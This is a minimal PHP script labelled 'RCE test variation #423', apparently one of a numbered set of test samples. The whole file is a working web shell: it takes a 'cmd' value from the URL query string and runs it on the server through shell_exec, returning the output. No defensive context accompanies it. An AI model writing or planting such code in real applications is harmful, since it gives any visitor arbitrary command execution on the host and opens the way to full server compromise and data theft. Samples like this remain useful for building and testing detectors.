<?php
// RCE test variation #423
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>